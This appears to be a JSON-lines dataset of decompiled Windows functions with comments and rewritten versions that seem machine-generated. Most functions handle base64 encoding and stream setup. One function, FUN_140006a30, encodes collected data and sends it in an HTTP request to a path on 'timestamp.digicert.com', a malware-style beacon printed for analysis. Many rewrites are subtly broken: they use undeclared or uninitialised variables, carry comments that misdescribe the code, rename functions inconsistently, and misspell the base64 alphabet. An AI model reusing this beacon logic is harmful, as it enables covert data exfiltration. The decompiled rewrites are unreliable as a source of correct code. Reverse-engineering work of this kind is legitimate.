is not 0\n        if (new_iVar2 != 0) {\n            new_lVar8 = (longlong)new_iVar11;\n            goto LAB_14000695b;\n        }\n    }\n    \n    new_lVar8 = (longlong)new_iVar11;\n    *(undefined2 *)(new_unaff_RDI + new_lVar8 * 2) = 0;\n    \nLAB_14000695b:\n    \n    // Check the value of iVar2\n    if (new_iVar2 == 1) {\n        *(undefined4 *)(new_unaff_RDI + 4 + new_lVar8 * 2) = 0x3d003d;\n        *(undefined2 *)(new_unaff_RDI + 8 + new_lVar8 * 2) = 0;\n        *(wchar_t *)(new_unaff_RDI + new_lVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[new_uVar9 >> 2];\n        *(wchar_t *)(new_unaff_RDI + 2 + new_lVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[((new_uVar9 & 3) << 4) | new_uVar4 >> 4];\n    }\n    else if (new_iVar2 == 2) {\n        *(undefined4 *)(new_unaff_RDI + 6 + new_lVar8 * 2) = 0x3d;\n        *(wchar_t *)(new_unaff_RDI + new_lVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[new_uVar9 >> 2];\n        *(wchar_t *)(new_unaff_RDI + 2 + new_lVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[((new_uVar9 & 3) << 4) | new_uVar4 >> 4];\n        *(wchar_t *)(new_unaff_RDI + 4 + new_lVar8 * 2) = L\"ABCDEFGHIJKLMNOPQRSTUVWXYZabcedfghijklmnopqrstuvwxyz0123456789+/\"[((uint)new_uVar4 & 0xf) << 2) | new_uVar6 >> 6];\n    }\n    \n    return 1; // Return 1\n}\n"}
{"Function Name": "FUN_14000688d", "Address": "14000688d", "Source Code": "\n// Function definition\nundefined8 FUN_14000688d(undefined8 new_param_1,int new_param_2,longlong new_param_3,undefined1 *new_param_4)\n{\n    ulonglong new_uVar1;\n    int new_unaff_EBP = 0;\n    longlong new_unaff_RDI = new_param_1;\n    longlong new_lVar2;\n    longlong new_in_R10 = new_param_3;\n    uint new_uVar3;\n    longlong new_unaff_R12 = 0;\n    ulonglong new_unaff_R15 = 0;\n    \n    // Loop through the input data\n    do {\n        // Store data in stack\n        (&stack0x00000040)[new_unaff_R15 & 0xffffffff] = *new_param_4;\n        new_unaff_R15++;\n        new_uVar3 = (uint)in_stack_00000040;\n        new_param_2++;\n        // Check if 3 elements have been processed\n        if (new_unaff_R15 == 3) {\n            new_unaff_EBP += 4;\n            // Process and store data in unaff_RDI\n            *(undefined2 *)(new_unaff_RDI + 4) = *(undefined2 *)(new_unaff_R12 + (ulonglong)(in_stack_00000040 >> 2) * 2);\n            *(undefined2 *)(new_unaff_RDI + 6) = *(undefined2 *)(new_unaff_R12 + ((ulonglong)((new_uVar3 & 3) << 4) | (ulonglong)(in_stack_00000041 >> 4)) * 2);\n            *(undefined2 *)(new_unaff_RDI + 8) = *(undefined2 *)(new_unaff_R12 + ((ulonglong)((in_stack_00000041 & 0xf) << 2) | (ulonglong)(in_stack_00000042 >> 6)) * 2);\n            *(undefined2 *)(new_unaff_RDI + 10) = *(undefined2 *)(new_unaff_R12 + (ulonglong)(in_stack_00000042 & 0x3f) * 2);\n            new_unaff_RDI += 16;\n            new_unaff_R15 = 0;\n            new_param_2 = (int)new_unaff_R15;\n        }\n        new_param_4++;\n        new_param_3++;\n    } while (new_param_3 != new_in_R10);\n    \n    // Check if param_2 is 0\n    if (new_param_2 == 0) {\n        // Store data in unaff_RDI\n        *(short *)(new_unaff_RDI + (longlong)new_unaff_EBP * 2) = (short)new_unaff_R15;\n    }\n    \n    new_lVar2 = (longlong)new_unaff_EBP;\n    \n    // Check if param_2 is 1\n    if (new_param_2 == 1) {\n        // Store data in unaff_RDI\n        *(undefined4 *)(new_unaff_RDI + 4 + new_lVar2 * 2) = 0x3d003d;\n        *(short *)(new_unaff_RDI + 8 + new_lVar2 * 2) = (short)new_unaff_R15;\n        *(undefined2 *)(new_unaff_RDI + new_lVar2 * 2) = *(undefined2 *)(new_unaff_R12 + (ulonglong)(in_stack_00000040 >> 2) * 2);\n        *(undefined2 *)(new_unaff_RDI + 2 + new_lVar2 * 2) = *(undefined2 *)(new_unaff_R12 + ((ulonglong)((new_uVar3 & 3) << 4) | (ulonglong)(in_stack_00000041 >> 4)) * 2);\n    }\n    // Check if param_2 is 2\n    else if (new_param_2 == 2) {\n        // Store data in unaff_RDI\n        *(undefined4 *)(new_unaff_RDI + 6 + new_lVar2 * 2) = 0x3d;\n        *(undefined2 *)(new_unaff_RDI + new_lVar2 * 2) = *(undefined2 *)(new_unaff_R12 + (ulonglong)(in_stack_00000040 >> 2) * 2);\n        *(undefined2 *)(new_unaff_RDI + 2 + new_lVar2 * 2) = *(undefined2 *)(new_unaff_R12 + ((ulonglong)((new_uVar3 & 3) << 4) | (ulonglong)(in_stack_00000041 >> 4)) * 2);\n        *(undefined2 *)(new_unaff_RDI + 4 + new_lVar2 * 2) = *(undefined2 *)(new_unaff_R12 + ((ulonglong)((in_stack_00000041 & 0xf) << 2) | (ulonglong)(in_stack_00000042 >> 6)) * 2);\n    }\n    \n    return 1;\n}\n"}
{"Function Name": "FUN_14000693e", "Address": "14000693e", "Source Code": "\n// Function definition for FUN_14000693e\nundefined8 FUN_14000693e(undefined8 new_param_1, int new_param_2)\n{\n    // Cast param_2 to a longlong variable\n    longlong new_lVar1 = (longlong)new_param_2;\n    \n    // Check if param_2 is equal to 1\n    if (new_param_2 == 1) {\n        // Set a specific value at an offset in memory based on lVar1\n        *(undefined4 *)(new_param_1 + 4 + new_lVar1 * 2) = 0x3d003d;\n        // Copy a value from one memory location to another\n        *(undefined2 *)(new_param_1 + 8 + new_lVar1 * 2) = *(undefined2 *)(new_param_1 + new_lVar1 * 2);\n        // Copy a value from one memory location to another\n        *(undefined2 *)(new_param_1 + 2 + new_lVar1 * 2) = *(undefined2 *)(new_param_1 + new_lVar1 * 2);\n    }\n    // Check if param_2 is equal to 2\n    else if (new_param_2 == 2) {\n        // Set a specific value at an offset in memory based on lVar1\n        *(undefined4 *)(new_param_1 + 6 + new_lVar1 * 2) = 0x3d;\n        // Copy a value from one memory location to another\n        *(undefined2 *)(new_param_1 + 2 + new_lVar1 * 2) = *(undefined2 *)(new_param_1 + new_lVar1 * 2);\n        // Copy a value from one memory location to another\n        *(undefined2 *)(new_param_1 + 4 + new_lVar1 * 2) = *(undefined2 *)(new_param_1 + new_lVar1 * 2);\n        // Copy a value from one memory location to another\n        *(undefined2 *)(new_param_1 + new_lVar1 * 2) = *(undefined2 *)(new_param_1 + new_lVar1 * 2);\n    }\n    \n    // Return 1\n    return 1;\n}\n"}
{"Function Name": "FUN_140006965", "Address": "140006965", "Source Code": "\\*\n// Set a specific value at a calculated memory address\n*(undefined4 *)(memory_address + 4 + offset * 2) = 0x3d003d;\n\n// Set a specific value at a calculated memory address\n*(undefined2 *)(memory_address + 8 + offset * 2) = value;\n\n// Copy a value from one memory location to another\n*(undefined2 *)(memory_address + offset * 2) = *(undefined2 *)(source_address + (ulonglong)(bitwise_value >> 2) * 2);\n\n// Perform bitwise operations and copy a value to a memory location\n*(undefined2 *)(memory_address + 2 + offset * 2) = *(undefined2 *)(source_address + ((ulonglong)((bitwise_value & 3) << 4) | (ulonglong)(bitwise_shift >> 4)) * 2);\n*\\ \n \nundefined8 FUN_140006965(undefined8 param_1, undefined8 param_2, longlong offset)\n{\n    byte bitwise_shift;\n    longlong memory_address;\n    byte bitwise_value;\n    longlong source_address;\n    undefined2 value;\n\n    *(undefined4 *)(memory_address + 4 + offset * 2) = 0x3d003d;\n    *(undefined2 *)(memory_address + 8 + offset * 2) = value;\n    *(undefined2 *)(memory_address + offset * 2) = *(undefined2 *)(source_address + (ulonglong)(bitwise_value >> 2) * 2);\n    *(undefined2 *)(memory_address + 2 + offset * 2) = *(undefined2 *)(source_address + ((ulonglong)((bitwise_value & 3) << 4) | (ulonglong)(bitwise_shift >> 4)) * 2);\n    \n    return 1;\n}"}
{"Function Name": "FUN_140006a30", "Address": "140006a30", "Source Code": "\\*\n// Allocate memory for _Src\n_NewSrc = (wchar_t *)operator_new(0x2000);\n\n// Allocate memory for _Src_00\n_NewSrc_00 = (wchar_t *)operator_new(0x20000);\n\n// Call function to initialize _Src with data from DAT_14003aa10\nuVar2 = FUN_140006810(&DAT_14003aa10, (longlong)_Src, 0x1000);\nbVar7 = (int)uVar2 != 0;\n\n// Check if DAT_140038b18 is not zero and call function to process it\nif (DAT_140038b18 != 0) {\n    FUN_140008db0((longlong *)&local_48, DAT_140038b18);\n}\n\n// Check condition and assign value to puVar6\nif (0xf < DAT_140038b20) {\n    puVar6 = DAT_140038b08;\n}\n\n// Call function to process data using local_48, puVar6, and DAT_140038b18\nFUN_14000c330(local_48, puVar6, DAT_140038b18);\n\n// Call function to initialize _Src_00 with data from local_48\nuVar2 = FUN_140006810(&local_48, (longlong)_Src_00, 0x10000);\nlocal_58 = (uint)((int)uVar2 != 0);\n\n// Open Internet connection and connect to a server\nlVar3 = InternetOpenW(&DAT_1400316bc, 0, 0, 0);\n\n// Check if Internet connection is successful\nif (lVar3 != 0) {\n    lVar4 = InternetConnectW(lVar3, L\"timestamp.digicert.com\", 0x50, 0);\n\n    // Check if connection is successful\n    if (lVar4 != 0) {\n        // Allocate memory for _Dst and initialize it with \"/registered\"\n        _Dst = (wchar_t *)operator_new(0x2040);\n        wcscpy_s(_Dst, 0x1020, L\"/registered\");\n\n        // Append data to _Dst based on conditions\n        if (bVar7) {\n            // Append data from _Src if bVar7 is true\n            wcscat_s(_Dst, 0x1020, L\"?\");\n            wcscat_s(_Dst, 0x1020, L\"code\");\n            wcscat_s(_Dst, 0x1020, L\"=\");\n            wcscat_s(_Dst, 0x1020, _Src);\n        }\n\n        // Append data from _Src_00 if local_58 is not zero\n        if (local_58 != 0) {\n            if (bVar7) {\n                _Src_01 = L\"&\";\n            }\n\n            wcscat_s(_Dst, 0x1020, _Src_01);\n            wcscat_s(_Dst, 0x1020, L\"t\");\n            wcscat_s(_Dst, 0x1020, _Src_00);\n        }\n\n        // Open HTTP request and send data\n        lVar5 = HttpOpenRequestW(lVar4, &DAT_1400317f0, _Dst, L\"HTTP/1.0\");\n\n        if (lVar5 != 0) {\n            HttpSendRequestW(lVar5, 0, 0, 0);\n            InternetCloseHandle(lVar5);\n        }\n\n        // Close handles and perform cleanup\n        thunk_FUN_14000b460();\n        InternetCloseHandle(lVar4);\n    }\n\n    InternetCloseHandle(lVar3);\n}\n\n// Perform cleanup\nthunk_FUN_14000b460();\nthunk_FUN_14000b460();\n\n// Check conditions and perform actions\nif (local_48 != (undefined8 *)0x0) {\n    if ((0xfff < (ulonglong)(local_38 - (longlong)local_48)) &&\n        (0x1f < (ulonglong)((longlong)local_48 + (-8 - local_48[-1]))) {\n        FUN_14000ed18();\n        pcVar1 = (code *)swi(3);\n        (*pcVar1)();\n        return;\n    }\n\n    thunk_FUN_14000b460();\n}\n\n// Perform security check and return\n__security_check_cookie(local_30 ^ (ulonglong)auStack_98);\nreturn;\n*\\ \n \nvoid FUN_140006a30(void)\n{\n    wchar_t *_Src;\n    wchar_t *_Src_00;\n    undefined8 uVar2;\n    longlong lVar3;\n    longlong lVar4;\n    wchar_t *_Dst;\n    longlong lVar5;\n    bool bVar7;\n    \n    _Src = (wchar_t *)operator_new(0x2000);\n    _Src_00 = (wchar_t *)operator_new(0x20000);\n    uVar2 = FUN_140006810(&DAT_14003aa10, (longlong)_Src, 0x1000);\n    bVar7 = (int)uVar2 != 0;\n    \n    if (DAT_140038b18 != 0) {\n        FUN_140008db0((longlong *)&local_48, DAT_140038b18);\n    }\n    \n    if (0xf < DAT_140038b20) {\n        puVar6 = DAT_140038b08;\n    }\n    \n    FUN_14000c330(local_48, puVar6, DAT_140038b18);\n    \n    uVar2 = FUN_140006810(&local_48, (longlong)_Src_00, 0x10000);\n    local_58 = (uint)((int)uVar2 != 0);\n    \n    lVar3 = InternetOpenW(&DAT_1400316bc, 0, 0, 0);\n    \n    if (lVar3 != 0) {\n        lVar4 = InternetConnectW(lVar3, L\"timestamp.digicert.com\", 0x50, 0);\n        \n        if (lVar4 != 0) {\n            _Dst = (wchar_t *)operator_new(0x2040);\n            wcscpy_s(_Dst, 0x1020, L\"/registered\");\n            \n            if (bVar7) {\n                wcscat_s(_Dst, 0x1020, L\"?\");\n                wcscat_s(_Dst, 0x1020, L\"code\");\n                wcscat_s(_Dst, 0x1020, L\"=\");\n                wcscat_s(_Dst, 0x1020, _Src);\n            }\n            \n            if (local_58 != 0) {\n                if (bVar7) {\n                    _Src_01 = L\"&\";\n                }\n                \n                wcscat_s(_Dst, 0x1020, _Src_01);\n                wcscat_s(_Dst, 0x1020, L\"t\");\n                wcscat_s(_Dst, 0x1020, _Src_00);\n            }\n            \n            lVar5 = HttpOpenRequestW(lVar4, &DAT_1400317f0, _Dst, L\"HTTP/1.0\");\n            \n            if (lVar5 != 0) {\n                HttpSendRequestW(lVar5, 0, 0, 0);\n                InternetCloseHandle(lVar5);\n            }\n            \n            thunk_FUN_14000b460();\n            InternetCloseHandle(lVar4);\n        }\n        \n        InternetCloseHandle(lVar3);\n    }\n    \n    thunk_FUN_14000b460();\n    thunk_FUN_14000b460();\n    \n    if (local_48 != (undefined8 *)0x0) {\n        if ((0xfff < (ulonglong)(local_38 - (longlong)local_48)) &&\n            (0x1f < (ulonglong)((longlong)local_48 + (-8 - local_48[-1]))) {\n            FUN_14000ed18();\n            pcVar1 = (code *)swi(3);\n            (*pcVar1)();\n            return;\n        }\n        \n        thunk_FUN_14000b460();\n    }\n    \n    __security_check_cookie(local_30 ^ (ulonglong)auStack_98);\n    return;\n}"}
{"Function Name": "FUN_140006d60", "Address": "140006d60", "Source Code": "\n// Function to process a longlong pointer\nvoid processPointer(longlong *ptr)\n{\n    longlong value = *ptr; // Get the value at the memory location pointed by param_1\n\n    // Check if the value is not equal to 0\n    if (value != 0) {\n        // Check conditions for param_1[2] and lVar1\n        if ((0xfff < (ulonglong)(ptr[2] - value)) &&\n            (0x1f < (value - *(longlong *)(value + -8)) - 8U)) {\n            functionA(); // Call function FUN_14000ed18\n            swi(3)(); // Software interrupt\n            return;\n        }\n\n        functionB(); // Call function thunk_FUN_14000b460\n        *ptr = 0; // Set the value at param_1 to 0\n        ptr[1] = 0; // Set the value at param_1 + 1 to 0\n        ptr[2] = 0; // Set the value at param_1 + 2 to 0\n    }\n    return; // Return from the function\n}\n"}
{"Function Name": "FUN_140006dc0", "Address": "140006dc0", "Source Code": "\nvoid FUN_140006dc0(undefined8 *new_param)\n{\n    // Check if the value pointed to by param_1 is not equal to 0\n    if (*new_param != 0) {\n        // Call function FUN_14000ead0 with the value casted to LPVOID\n        FUN_14000ead0((LPVOID)*new_param);\n    }\n    // Set the value pointed to by param_1 to 0\n    *new_param = 0;\n}\n"}
{"Function Name": "std::basic_string<wchar_t,struct_std::char_traits<wchar_t>,class_std::allocator<wchar_t>_>::_Tidy_deallocate", "Address": "140006df0", "Source Code": "\\*\n// Function to deallocate memory for a basic_string object\nvoid __thiscall std::basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t> >::\n_Tidy_deallocate(basic_string<wchar_t, struct std::char_traits<wchar_t>, class std::allocator<wchar_t> > *this)\n{\n    // Check if the allocated memory is greater than 7\n    if (7 < *(ulonglong *)(this + 0x18)) {\n        // Set the allocated memory to 7\n        *(undefined8 *)(this + 0x18) = 7;\n        // Set the memory offset to 0\n        *(undefined8 *)(this + 0x10) = 0;\n        // Set the first two bytes of the object to 0\n        *(undefined2 *)this = 0;\n        // Return from the function\n        return;\n    }\n}\n*\\ \n \nvoid __thiscall\nstd::basic_string<wchar_t,struct_std::char_traits<wchar_t>,class_std::allocator<wchar_t>_>::\n_Tidy_deallocate(basic_string<wchar_t,struct_std::char_traits<wchar_t>,class_std::allocator<wchar_t>_>\n*this)\n{\nif (7 < *(ulonglong *)(this + 0x18)) {\n*(undefined8 *)(this + 0x18) = 7;\n*(undefined8 *)(this + 0x10) = 0;\n*(undefined2 *)this = 0;\nreturn;\n}\n}"}
{"Function Name": "FUN_140006e60", "Address": "140006e60", "Source Code": "\nvoid FUN_140006e60(longlong *data_ptr)\n{\n    // Check if the value at index 3 of param_1 is greater than 0xf\n    if (0xf < (ulonglong)data_ptr[3]) {\n        // Check if (0xfff < param_1[3] + 1U) and (0x1f < (*param_1 - *(longlong *)(*param_1 + -8)) - 8U)\n        if ((0xfff < data_ptr[3] + 1U) && (0x1f < (*data_ptr - *(longlong *)(*data_ptr + -8)) - 8U)) {\n            // Call function FUN_14000ed18\n            FUN_14000ed18();\n            // Call the function pointer returned by swi(3)\n            (*(code *)swi(3))();\n            return;\n        }\n        // Call function thunk_FUN_14000b460\n        thunk_FUN_14000b460();\n    }\n    // Set the value at index 2 of param_1 to 0\n    data_ptr[2] = 0;\n    // Set the value at index 3 of param_1 to 0xf\n    data_ptr[3] = 0xf;\n    // Set the value at the beginning of param_1 to 0\n    *(undefined1 *)data_ptr = 0;\n    return;\n}\n"}
{"Function Name": "FUN_140006ec0", "Address": "140006ec0", "Source Code": "\\*\n// Set the value at index 0 of param_1 to the address of DAT_1400324c8\n*new_param = (longlong)&DAT_1400324c8;\n\n// Set the value at index 2 of param_1 to the address of DAT_1400318f8\nnew_param[2] = (longlong)&DAT_1400318f8;\n\n// Set the value at index 0x13 of param_1 to the vftable of std::basic_ios<char,struct_std::char_traits<char>_>\nnew_param[0x13] = (longlong)std::basic_ios<char,struct_std::char_traits<char>_>::vftable;\n\n// Set values at specific memory locations based on calculations\n*(undefined ***)((longlong)*(int *)(*new_param + 4) + (longlong)new_param) = std::basic_istream<char,struct_std::char_traits<char>_>::vftable;\n*(int *)((longlong)*(int *)(*new_param + 4) + -4 + (longlong)new_param) = *(int *)(*new_param + 4) + -0x18;\n\n// Call function FUN_140007ff0 with specific parameters\nFUN_140007ff0((longlong)*(int *)(*new_param + 4) + (longlong)new_param,new_param + 3);\n\n// Set values at specific memory locations based on calculations\n*(undefined ***)((longlong)*(int *)(new_param[2] + 4) + 0x10 + (longlong)new_param) = std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;\n*(int *)((longlong)*(int *)(new_param[2] + 4) + 0xc + (longlong)new_param) = *(int *)(new_param[2] + 4) + -0x10;\n\n// Set values at specific memory locations based on calculations\n*(undefined ***)((longlong)*(int *)(*new_param + 4) + (longlong)new_param) = std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;\n*(int *)((longlong)*(int *)(*new_param + 4) + -4 + (longlong)new_param) = *(int *)(*new_param + 4) + -0x20;\n\n// Set values at specific memory locations based on calculations\n*(undefined ***)((longlong)*(int *)(*new_param + 4) + (longlong)new_param) = std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\n*(int *)((longlong)*(int *)(*new_param + 4) + -4 + (longlong)new_param) = *(int *)(*new_param + 4) + -0x98;\n\n// Allocate memory and initialize values\nundefined8 *new_puVar1 = (undefined8 *)operator_new(0x10);\n*new_puVar1 = 0;\nnew_puVar1[1] = 0;\n_Locimp *new_p_Var2 = std::locale::_Init(true);\nnew_puVar1[1] = new_p_Var2;\nnew_param[0xf] = (longlong)new_puVar1;\n\n// Set values at specific indices of param_1\nnew_param[6] = (longlong)(new_param + 4);\nnew_param[7] = (longlong)(new_param + 5);\nnew_param[10] = (longlong)(new_param + 8);\nnew_param[0xb] = (longlong)(new_param + 9);\nnew_param[0xd] = (longlong)(new_param + 0xc);\nnew_param[0xe] = (longlong)new_param + 100;\nnew_param[5] = 0;\n*(undefined8 *)new_param[0xb] = 0;\n*(undefined4 *)new_param[0xe] = 0;\n*(undefined8 *)new_param[6] = 0;\n*(undefined8 *)new_param[10] = 0;\n*(undefined4 *)new_param[0xd] = 0;\n\n// Set values at specific indices of param_1\nnew_param[3] = (longlong)std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\nnew_param[0x10] = 0;\n*(undefined4 *)(new_param + 0x11) = 0;\n\n// Return param_1\nreturn new_param;\n*\\ \n \nlonglong * FUN_140006ec0(longlong *new_param)\n{\n    *new_param = (longlong)&DAT_1400324c8;\n    new_param[2] = (longlong)&DAT_1400318f8;\n    new_param[0x13] = (longlong)std::basic_ios<char,struct_std::char_traits<char>_>::vftable;\n    *(undefined ***)((longlong)*(int *)(*new_param + 4) + (longlong)new_param) = std::basic_istream<char,struct_std::char_traits<char>_>::vftable;\n    *(int *)((longlong)*(int *)(*new_param + 4) + -4 + (longlong)new_param) = *(int *)(*new_param + 4) + -0x18;\n    new_param[1] = 0;\n    FUN_140007ff0((longlong)*(int *)(*new_param + 4) + (longlong)new_param,new_param + 3);\n    *(undefined ***)((longlong)*(int *)(new_param[2] + 4) + 0x10 + (longlong)new_param) = std::basic_ostream<char,struct_std::char_traits<char>_>::vftable;\n    *(int *)((longlong)*(int *)(new_param[2] + 4) + 0xc + (longlong)new_param) = *(int *)(new_param[2] + 4) + -0x10;\n    *(undefined ***)((longlong)*(int *)(*new_param + 4) + (longlong)new_param) = std::basic_iostream<char,struct_std::char_traits<char>_>::vftable;\n    *(int *)((longlong)*(int *)(*new_param + 4) + -4 + (longlong)new_param) = *(int *)(*new_param + 4) + -0x20;\n    *(undefined ***)((longlong)*(int *)(*new_param + 4) + (longlong)new_param) = std::basic_stringstream<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\n    *(int *)((longlong)*(int *)(*new_param + 4) + -4 + (longlong)new_param) = *(int *)(*new_param + 4) + -0x98;\n    new_param[3] = (longlong)std::basic_streambuf<char,struct_std::char_traits<char>_>::vftable;\n    undefined8 *new_puVar1 = (undefined8 *)operator_new(0x10);\n    *new_puVar1 = 0;\n    new_puVar1[1] = 0;\n    _Locimp *new_p_Var2 = std::locale::_Init(true);\n    new_puVar1[1] = new_p_Var2;\n    new_param[0xf] = (longlong)new_puVar1;\n    new_param[6] = (longlong)(new_param + 4);\n    new_param[7] = (longlong)(new_param + 5);\n    new_param[10] = (longlong)(new_param + 8);\n    new_param[0xb] = (longlong)(new_param + 9);\n    new_param[0xd] = (longlong)(new_param + 0xc);\n    new_param[0xe] = (longlong)new_param + 100;\n    new_param[5] = 0;\n    *(undefined8 *)new_param[0xb] = 0;\n    *(undefined4 *)new_param[0xe] = 0;\n    *(undefined8 *)new_param[6] = 0;\n    *(undefined8 *)new_param[10] = 0;\n    *(undefined4 *)new_param[0xd] = 0;\n    new_param[3] = (longlong)std::basic_stringbuf<char,struct_std::char_traits<char>,class_std::allocator<char>_>::vftable;\n    new_param[0x10] = 0;\n    *(undefined4 *)(new_param + 0x11) = 0;\n    return new_param;\n}"}
{"Function Name": "FUN_140007060", "Address": "140007060", "Source Code": "\n// Function definition for FUN_140007060\nulonglong * FUN_140007060(longlong input_ptr, ulonglong *output_ptr, longlong *array_ptr, byte flag)\n{\n    ulonglong sum_var;\n    longlong value1;\n    longlong value2;\n\n    // Calculate the sum of the two elements in param_3\n    sum_var = array_ptr[1] + *array_ptr;\n    \n    // Retrieve values from memory addresses based on offsets from param_1\n    longlong value3 = **(longlong **)(input_ptr + 0x38);\n    sum_var = **(ulonglong **)(input_ptr + 0x40);\n    \n    // Update value at offset param_1 + 0x68 if conditions are met\n    if ((sum_var != 0) && (*(ulonglong *)(input_ptr + 0x68) < sum_var)) {\n        *(ulonglong *)(input_ptr + 0x68) = sum_var;\n    }\n    \n    // Retrieve additional values from memory addresses based on offsets from param_1\n    value1 = *(longlong *)(input_ptr + 0x68);\n    value2 = **(longlong **)(input_ptr + 0x18);\n    \n    // Check conditions and update param_2 accordingly\n    if (((ulonglong)(value1 - value2) < sum_var) ||\n        ((sum_var != 0 && (((flag & 1) != 0 && (value3 == 0)) || (((flag & 2) != 0 && (sum_var == 0))))))) {\n        *output_ptr = 0xffffffffffffffff;\n    }\n    else {\n        longlong new_value = value2 + sum_var;\n        \n        // Update values at memory addresses based on conditions\n        if (((flag & 1) != 0) && (value3 != 0)) {\n            **(longlong **)(input_ptr + 0x38) = new_value;\n            **(int **)(input_ptr + 0x50) = (int)value1 - (int)new_value;\n        }\n        if (((flag & 2) != 0) && (sum_var != 0)) {\n            int iVar2 = **(int **)(input_ptr + 0x58);\n            **(longlong **)(input_ptr + 0x20) = value2;\n            **(longlong **)(input_ptr + 0x40) = new_value;\n            **(int **)(input_ptr + 0x58) = (iVar2 + (int)sum_var) - (int)new_value;\n        }\n        \n        // Update param_2 with uVar4\n        *output_ptr = sum_var;\n    }\n    \n    // Reset additional elements in param_2 and return\n    output_ptr[1] = 0;\n    output_ptr[2] = 0;\n    return output_ptr;\n}\n"}
{"Function Name": "FUN_140007150", "Address": "140007150", "Source Code": "\n// Function definition for FUN_140007150\nulonglong *FUN_140007150(longlong input_ptr, ulonglong *output_ptr, longlong increment_val, int case_val, byte flag_val)\n{\n    longlong temp_var1;\n    int temp_var2;\n    longlong temp_var3;\n    ulonglong temp_var4;\n    longlong temp_var5;\n    longlong temp_var6;\n    ulonglong temp_var8;\n    ulonglong temp_var9;\n\n    // Retrieve values from memory addresses based on offsets\n    temp_var3 = **(longlong **)(input_ptr + 0x38);\n    temp_var4 = **(ulonglong **)(input_ptr + 0x40);\n\n    // Check conditions and update memory if necessary\n    if ((temp_var4 != 0) && (*(ulonglong *)(input_ptr + 0x68) < temp_var4)) {\n        *(ulonglong *)(input_ptr + 0x68) = temp_var4;\n    }\n    temp_var5 = *(longlong *)(input_ptr + 0x68);\n    temp_var6 = **(longlong **)(input_ptr + 0x18);\n    temp_var9 = temp_var5 - temp_var6;\n\n    // Handle different cases based on param_4 and param_5 values\n    if (case_val == 0) {\n        temp_var8 = 0;\n        LAB_140007201:\n        temp_var8 = temp_var8 + increment_val;\n        if ((temp_var8 <= temp_var9) &&\n            ((temp_var8 == 0 ||\n            ((((flag_val & 1) == 0 || (temp_var3 != 0)) && (((flag_val & 2) == 0 || (temp_var4 != 0))))))) {\n            temp_var1 = temp_var6 + temp_var8;\n            if (((flag_val & 1) != 0) && (temp_var3 != 0)) {\n                **(longlong **)(input_ptr + 0x38) = temp_var1;\n                **(int **)(input_ptr + 0x50) = (int)temp_var5 - (int)temp_var1;\n            }\n            if (((flag_val & 2) != 0) && (temp_var4 != 0)) {\n                temp_var2 = **(int **)(input_ptr + 0x58);\n                temp_var7 = **(undefined8 **)(input_ptr + 0x40);\n                **(longlong **)(input_ptr + 0x20) = temp_var6;\n                **(longlong **)(input_ptr + 0x40) = temp_var1;\n                **(int **)(input_ptr + 0x58) = (temp_var2 + (int)temp_var7) - (int)temp_var1;\n            }\n            *output_ptr = temp_var8;\n            goto LAB_14000727c;\n        }\n    }\n    else if (case_val == 1) {\n        if ((flag_val & 3) != 3) {\n            if ((flag_val & 1) == 0) {\n                if (((flag_val & 2) != 0) && ((temp_var4 != 0 || (temp_var6 == 0)))) {\n                    temp_var8 = temp_var4 - temp_var6;\n                    goto LAB_140007201;\n                }\n            }\n            else if ((temp_var3 != 0) || (temp_var6 == 0)) {\n                temp_var8 = temp_var3 - temp_var6;\n                goto LAB_140007201;\n            }\n        }\n    }\n    else {\n        temp_var8 = temp_var9;\n        if (case_val == 2) goto LAB_140007201;\n    }\n    *output_ptr = 0xffffffffffffffff;\n    LAB_14000727c:\n    output_ptr[1] = 0;\n    output_ptr[2] = 0;\n    return output_ptr;\n}\n"}
{"Function Name": "FUN_1400072b0", "Address": "1400072b0", "Source Code": "\n// Function definition for FUN_1400072b0\nulonglong FUN_1400072b0(longlong param_1)\n{\n    byte *new_pbVar; // Pointer to byte\n    byte *updated_pbVar; // Pointer to byte\n    byte *final_pbVar; // Pointer to byte\n    \n    // Get pointer from offset 0x38 of param_1\n    updated_pbVar = (byte *)*(undefined8 **)(param_1 + 0x38);\n    \n    // Check if pbVar4 is not NULL\n    if (updated_pbVar != NULL) {\n        // Check if pbVar4 is within valid range\n        if (updated_pbVar < updated_pbVar + **(int **)(param_1 + 0x50)) {\n            return (ulonglong)*updated_pbVar; // Return value of pbVar4\n        }\n        \n        // Get pointer from offset 0x40 of param_1\n        new_pbVar = (byte *)**(undefined8 **)(param_1 + 0x40);\n        \n        // Check if pbVar2 is not NULL and bit 2 of byte at offset 0x70 of param_1 is not set\n        if ((new_pbVar != NULL) && ((*(byte *)(param_1 + 0x70) & 4) == 0)) {\n            // Get pointer from offset 0x68 of param_1\n            final_pbVar = *(byte **)(param_1 + 0x68);\n            \n            // Update pbVar5 if it is less than pbVar2\n            if (final_pbVar < new_pbVar) {\n                final_pbVar = new_pbVar;\n            }\n            \n            // Check if pbVar4 is less than pbVar5\n            if (updated_pbVar < final_pbVar) {\n                // Update pointer at offset 0x68 of param_1\n                *(byte **)(param_1 + 0x68) = final_pbVar;\n                \n                // Set value at pbVar4 to value at offset 0x38 of param_1\n                *updated_pbVar = **(undefined8 **)(param_1 + 0x38);\n                \n                // Update value at offset 0x50 of param_1\n                **(int **)(param_1 + 0x50) = (int)final_pbVar - (int)**(undefined8 **)(param_1 + 0x38);\n                \n                return (ulonglong)*updated_pbVar; // Return value of pbVar4\n            }\n        }\n    }\n    \n    return 0xffffffff; // Return 0xffffffff\n}\n"}
